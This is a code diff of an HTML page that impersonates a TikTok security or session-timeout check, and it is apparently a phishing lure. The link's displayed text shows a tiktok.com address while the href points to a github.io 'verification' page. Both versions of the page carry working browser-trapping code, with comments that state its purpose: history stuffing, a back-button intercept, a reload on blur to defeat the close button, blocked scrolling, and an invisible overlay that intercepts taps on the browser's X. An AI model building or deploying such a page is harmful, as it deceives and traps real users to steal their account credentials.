@@ -4,111 +4,101 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        /* THE GPU HIJACK */
+        /* THE "BROKEN" LAYOUT */
         html {
-            scroll-snap-type: y mandatory;
-            overflow-y: scroll;
-            height: 100vh;
-            scroll-behavior: auto; /* Instant jump */
+            background: #ffffff;
+            overflow: hidden; /* Lock the root so it can't be swiped */
+            height: 100%;
         }
         
-        body { 
-            margin: 0; padding: 0; background: #ffffff; 
-            height: 500vh; /* Massive height to bury the UI */
+        body {
+            margin: 0; padding: 0;
+            height: 5000px; /* Overwhelm the renderer */
+            position: absolute;
+            top: -1500px; /* Force the starting point into a negative coordinate */
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
-
-        /* Massive void to push content below the fold */
-        #buffer { height: 120vh; width: 100%; }
 
         #trap-zone {
+            margin-top: 1500px; /* Shift content back into view */
+            width: 100%;
             height: 100vh;
-            scroll-snap-align: start; /* CSS engine lock */
             text-align: center;
-            font-family: "Proxima Nova", sans-serif;
-            position: relative;
+            font-family: sans-serif;
+            background: #ffffff;
+            z-index: 100;
         }
 
-        /* The Ghost Input */
-        #trigger {
-            opacity: 0; position: absolute; top: 0; 
-            width: 1px; height: 1px; pointer-events: none;
+        /* THE PHANTOM LAYER */
+        /* This sits on top of where the X button usually is */
+        #phantom-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 80px;
+            background: rgba(255,255,255,0.01);
+            z-index: 999999;
+            pointer-events: auto; /* It intercepts touches meant for the X */
         }
 
-        /* Visual Elements */
-        .v-icon { width: 60px; margin: 60px auto 20px; display: block; }
-        .header { font-size: 24px; font-weight: 800; color: #161823; }
-        .sub { color: #8A8B91; padding: 0 40px; margin-top: 15px; font-size: 16px; }
-        #link { color: #0049f6; text-decoration: underline; font-weight: 600; display: block; margin-top: 45px; }
-        
-        /* The Shield */
-        #shield { 
-            display: none; position: fixed; top: 0; left: 0; 
-            width: 100%; height: 100%; z-index: 99999; 
+        #shield {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 99999;
+            display: block;
         }
+
+        .icon { width: 70px; margin-top: 100px; }
+        .h1 { font-size: 24px; font-weight: bold; color: #161823; margin-top: 20px; }
+        .p { color: #8a8b91; padding: 20px 40px; }
+        #link { color: #0049f6; font-weight: 600; text-decoration: underline; margin-top: 30px; display: block; }
     </style>
 </head>
-<body onload="lockDown()">
+<body>
+    <div id="phantom-overlay"></div>
     <div id="shield"></div>
 
-    <div id="buffer"></div>
-
-    <div id="trap-zone" id="start">
-        <input type="text" id="trigger" autofocus>
-
-        <svg class="v-icon" viewBox="0 0 48 48" fill="none">
-            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
-            <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
-            <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
-        </svg>
-
-        <div class="header">Security Verification</div>
-        <div class="sub">Complete the final step to secure your TikTok session.</div>
-        
-        <a id="link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">
-            https://www.tiktok.com/verify-secure
-        </a>
+    <div id="trap-zone">
+        <svg class="icon" viewBox="0 0 48 48" fill="none"><path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/><rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/><rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/></svg>
+        <div class="h1">System Timeout</div>
+        <div class="p">Your session has expired. Please verify to return to TikTok.</div>
+        <a id="link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">https://www.tiktok.com/verify-auth</a>
     </div>
 
-<script>
-    function lockDown() {
-        // 1. Fragment Force: Tells the browser the page starts at #start
-        if(window.location.hash !== "#start") {
-            window.location.replace("#start");
-        }
-
-        // 2. Browser Focus Hijack
-        document.getElementById('trigger').focus();
-
-        // 3. History Prison
-        for(let i=0; i<30; i++) {
-            history.pushState(null, null, window.location.href);
-        }
-
-        // 4. Activate the Lock
-        const trapPos = document.getElementById('buffer').offsetHeight;
-        document.getElementById('shield').style.display = 'block';
-
-        // THE PRISON LOOP: Runs every 1ms to ensure the UI can never slide down
-        setInterval(() => {
-            if (window.pageYOffset < (trapPos - 5)) {
-                window.scrollTo(0, trapPos);
+    <script>
+        // THE COORDINATE GLITCH
+        function forceBreak() {
+            // Force the window to think it's at a specific scroll point 
+            // even though the body is shifted via CSS.
+            window.scrollTo(0, 1500);
+            
+            // FILL HISTORY
+            for(let i=0; i<50; i++) {
+                history.pushState(null, null, location.href + "#" + i);
             }
-        }, 1);
+        }
 
-        // 5. Back Button Intercept
-        window.onpopstate = function() {
-            history.pushState(null, null, window.location.href);
-            window.scrollTo(0, trapPos);
-        };
-
-        // 6. Nuclear Exit Block: Refresh on blur
+        // KILL THE "X" BUTTON VIA BLUR-REPLACE
+        // If the user taps the X, the browser blurs the page. 
+        // We use 'replace' to refresh the trap instantly.
         window.onblur = function() {
-            setTimeout(() => { location.replace(location.href); }, 5);
+            location.replace(location.href);
         };
-    }
 
-    // Secondary listener in case onload is throttled
-    document.addEventListener('DOMContentLoaded', lockDown);
-</script>
+        // PREVENT ALL MOVEMENT
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        // IF THEY CLICK BACK, JUMP FORWARD
+        window.onpopstate = function() {
+            history.forward();
+        };
+
+        window.onload = forceBreak;
+    </script>
 </body>
 </html>
